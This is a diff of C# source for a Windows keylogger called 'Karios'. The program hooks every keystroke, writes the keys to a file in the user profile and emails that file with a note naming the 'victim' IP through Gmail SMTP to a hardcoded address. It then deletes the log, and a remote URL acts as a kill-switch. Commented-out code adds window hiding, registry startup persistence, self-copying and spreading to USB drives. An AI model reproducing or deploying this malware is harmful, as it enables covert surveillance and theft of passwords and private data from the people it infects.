@@ -17,13 +17,13 @@ namespace Karios
 {
 
 
-     class InterceptKeys
-        {
-            private const int WH_KEYBOARD_LL = 13;
-            private const int WM_KEYDOWN = 0x0100;
-            private static LowLevelKeyboardProc _proc = HookCallback;
-            private static IntPtr _hookID = IntPtr.Zero;
-
+    class InterceptKeys
+    {
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+        private static string LocalIP;
         public static void Main()
         {
             var handle = GetConsoleWindow();
@@ -36,71 +36,73 @@ namespace Karios
                 {
                     string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
                     if (!webData.ToUpperInvariant().Contains("online"))
-                    
 
-                    // Hide the window
-                    //ShowWindow(handle, SW_HIDE);
-                    // Persitance feature
-                    //Duplicate();
-                    // Run on startup
-                    //SetStartup();
-                    // Start Applicatiom
-                    _hookID = SetHook(_proc);
+
+                        // Hide the window
+                        //ShowWindow(handle, SW_HIDE);
+                        // Persitance feature
+                        //Duplicate();
+                        // Run on startup
+                        //SetStartup();
+                        // Start Applicatiom
+                        _hookID = SetHook(_proc);
                     Application.Run();
                     UnhookWindowsHookEx(_hookID);
                 }
                 catch { }
             }
-
-
-
         }
-            private static IntPtr SetHook(LowLevelKeyboardProc proc)
+
+
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
             {
-                using (Process curProcess = Process.GetCurrentProcess())
-                using (ProcessModule curModule = curProcess.MainModule)
-                {
-                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                        GetModuleHandle(curModule.ModuleName), 0);
-                }
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
             }
+        }
 
-            private delegate IntPtr LowLevelKeyboardProc(
-                int nCode, IntPtr wParam, IntPtr lParam);
+        private delegate IntPtr LowLevelKeyboardProc(
+            int nCode, IntPtr wParam, IntPtr lParam);
 
-            private static IntPtr HookCallback(
-                int nCode, IntPtr wParam, IntPtr lParam)
+        private static IntPtr HookCallback(
+            int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+                string appName = AppDomain.CurrentDomain.FriendlyName;
+                int vkCode = Marshal.ReadInt32(lParam);
+                string fileName = DateTime.Now.ToString("yyyy-MM-dd");
+                // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+                string pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" +
+                fileName + ".txt";// TODO - get more secret location.
+                StreamWriter sw = new StreamWriter(pathToLog, true);
+                if ((Keys)vkCode != Keys.Space && (Keys)vkCode != Keys.Enter)
                 {
-                    string appName = AppDomain.CurrentDomain.FriendlyName;
-                    int vkCode = Marshal.ReadInt32(lParam);
-                    string fileName = DateTime.Now.ToString("yyyy-MM-dd");
-                    // StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
-                    string pathToLog = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" +
-                    fileName + ".txt";// TODO - get more secret location.
-                    StreamWriter sw = new StreamWriter(pathToLog, true);
-                    if ((Keys)vkCode != Keys.Space && (Keys)vkCode != Keys.Enter)
-                    {
-                        sw.Write(((Keys)vkCode).ToString().ToLower());
-                        Console.Write(((Keys)vkCode).ToString().ToLower());
-                    }
-                    else
-                    {
-                        sw.WriteLine("");
-                        sw.WriteLine((Keys)vkCode);
-                        Console.WriteLine((Keys)vkCode);
-                    }
-                    sw.Close();
+                    sw.Write(((Keys)vkCode).ToString().ToLower());
+                    Console.Write(((Keys)vkCode).ToString().ToLower());
+                }
+                else
+                {
+                    sw.WriteLine("");
+                    sw.WriteLine((Keys)vkCode);
+                    Console.WriteLine((Keys)vkCode);
+                }
+                sw.Close();
 
-                    if (File.ReadAllLines(pathToLog).Length > 100)
+                if (File.ReadAllLines(pathToLog).Length > 100)
+                {
+                    try
                     {
                         MailMessage mail = new MailMessage();
                         SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                         mail.From = new MailAddress("GINGIRULES@gmail.com");
                         mail.To.Add("GINGIRULES@gmail.com");
                         mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                        mail.Body = "New kelogging file from victim " + LocalIP() + ", finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
+                        mail.Body = "New kelogging file from victim (" + GetLocalIP(LocalIP) + ") , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
 
                         Attachment attachment;
                         attachment = new Attachment(pathToLog);
@@ -112,101 +114,102 @@ namespace Karios
                         //clear mail attachment
                         attachment.Dispose();
                         //copy program to an new destination
-                        //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
-                        DriveInfo[] alldrives = DriveInfo.GetDrives();
-
-                        /*
-                        foreach (DriveInfo d in alldrives)
-                        {
-                            if (d.DriveType == DriveType.Removable && d.IsReady)
-                            {
-                                File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
-                                    , d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
-                            }
-                        }
-                        */
-                        //delete log file.
-                        File.Delete(pathToLog);
-
                     }
+                    catch { }
 
-                }
-                return CallNextHookEx(_hookID, nCode, wParam, lParam);
-            }
-            /// <summary>
-            /// Sets the startup registary key
-            /// </summary>
-            /// 
+                    //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
+                    DriveInfo[] alldrives = DriveInfo.GetDrives();
 
-            /*
-            public static void SetStartup()
-            {
-                RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                string pathToSecCopy = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName;
-                string pathToApp = Application.ExecutablePath;
-                if (rkApp.GetValue(System.AppDomain.CurrentDomain.FriendlyName) == null)
-                {
-                    rkApp.SetValue(System.AppDomain.CurrentDomain.FriendlyName, pathToSecCopy);
-                }
+                    /*
+                    foreach (DriveInfo d in alldrives)
+                    {
+                        if (d.DriveType == DriveType.Removable && d.IsReady)
+                        {
+                            File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
+                                , d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
+                        }
+                    }
+                    */
+                    //delete log file.
+                    File.Delete(pathToLog);
 
-            }
-
-            public static void Duplicate()
-            {
-                if (Application.StartupPath != Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
-                {
-                    System.IO.File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
-                                    , Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName, true);
                 }
 
             }
-            */
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+        /// <summary>
+        /// Sets the startup registary key
+        /// </summary>
+        /// 
 
-            public static string LocalIP()
+        /*
+        public static void SetStartup()
+        {
+            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            string pathToSecCopy = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName;
+            string pathToApp = Application.ExecutablePath;
+            if (rkApp.GetValue(System.AppDomain.CurrentDomain.FriendlyName) == null)
             {
-                string localIP;
-                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
-                {
+                rkApp.SetValue(System.AppDomain.CurrentDomain.FriendlyName, pathToSecCopy);
+            }
+
+        }
+
+        public static void Duplicate()
+        {
+            if (Application.StartupPath != Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
+            {
+                System.IO.File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
+                                , Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName, true);
+            }
+
+        }
+        */
+
+        public static string GetLocalIP(string LocalIP)
+        {
+            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
+            {
                 try
                 {
                     socket.Connect("8.8.8.8", 65530);
                     IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
-                    localIP = endPoint.Address.ToString();
-                    return localIP;
+                    LocalIP = endPoint.Address.ToString();
+                    return LocalIP;
                 }
                 finally
                 {
                     //do something
                 }
             }
-             
         }
 
-            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-            private static extern IntPtr SetWindowsHookEx(int idHook,
-                LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook,
+            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
-            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-            [return: MarshalAs(UnmanagedType.Bool)]
-            private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
-            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-                IntPtr wParam, IntPtr lParam);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
 
-            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-            private static extern IntPtr GetModuleHandle(string lpModuleName);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-            [DllImport("kernel32.dll")]
-            static extern IntPtr GetConsoleWindow();
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
 
-            [DllImport("user32.dll")]
-            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-            const int SW_HIDE = 0;
-
-        }
-
-
-
+        const int SW_HIDE = 0;
     }
+}    
+
+
+
+    
